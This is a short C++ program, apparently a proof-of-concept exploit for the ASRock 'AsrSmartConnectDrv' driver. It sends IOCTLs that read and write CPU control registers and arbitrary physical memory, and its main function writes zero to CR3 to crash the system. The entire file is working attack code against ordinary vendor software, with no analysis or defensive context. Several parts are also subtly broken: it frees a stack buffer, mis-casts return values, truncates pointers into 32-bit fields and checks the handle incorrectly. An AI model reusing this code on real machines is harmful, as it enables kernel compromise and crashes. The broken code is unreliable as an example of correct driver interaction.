#include <Windows.h>
#include <iostream>

#define CODE_WRITE_CR 0x222870
#define CODE_READ_CR 0x22286C
#define CODE_WRITE_PHYS 0x22280C
#define CODE_READ_PHYS 0x222808

struct rweverything_args
{
	DWORD args1;
	DWORD args2;
	DWORD args3[3];
};

uint64_t ReadCrX(HANDLE hDevice, DWORD idx)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.args1 = idx;

	BYTE outBuf[0x1000];
	memset(&outBuf, 0, sizeof(outBuf));

	DWORD bytesReturned = 0;
	DeviceIoControl(hDevice, CODE_READ_CR, &args, sizeof(args), &outBuf, sizeof(outBuf), &bytesReturned, NULL);

	rweverything_args* out;

	out = reinterpret_cast<rweverything_args*>(malloc(bytesReturned));
	memcpy(out, outBuf, bytesReturned);
	free(outBuf);

	return reinterpret_cast<uint64_t>(out->args3);
}

void WriteCrX(HANDLE hDevice, DWORD idx, DWORD val)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.args1 = idx;
	*args.args3 = val;

	DWORD bytesReturned = 0;
	DeviceIoControl(hDevice, CODE_WRITE_CR, &args, sizeof(args), nullptr, NULL, &bytesReturned, NULL);
}

void WritePhysical(HANDLE hDevice, uint64_t physicalAddress, unsigned int size, void* buf)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));

	args.args1 = physicalAddress;
	args.args3[0] = size;
	args.args3[1] = 0;
	args.args3[2] = reinterpret_cast<uint64_t>(buf);

	DWORD bytesReturned = 0;
	DeviceIoControl(hDevice, CODE_WRITE_PHYS, &args, sizeof(args), nullptr, NULL, &bytesReturned, NULL);
}

void ReadPhysical(HANDLE hDevice, uint64_t physicalAddress, unsigned int size, void* outBuf)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));

	args.args1 = physicalAddress;
	args.args3[0] = size;
	args.args3[1] = 2;
	args.args3[2] = reinterpret_cast<uint64_t>(outBuf);

	DWORD bytesReturned = 0;
	DeviceIoControl(hDevice, CODE_READ_PHYS, &args, sizeof(args), nullptr, NULL, &bytesReturned, NULL);
}

int main()
{
	HANDLE hDevice = CreateFileA("\\\\.\\GlobalRoot\\Device\\AsrSmartConnectDrv", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == NULL)
	{
		printf("What you doin start driver!\n");
		return 1;
	}

	// Write 0 to cr3
	WriteCrX(hDevice, 3, 0);

	return 0;
}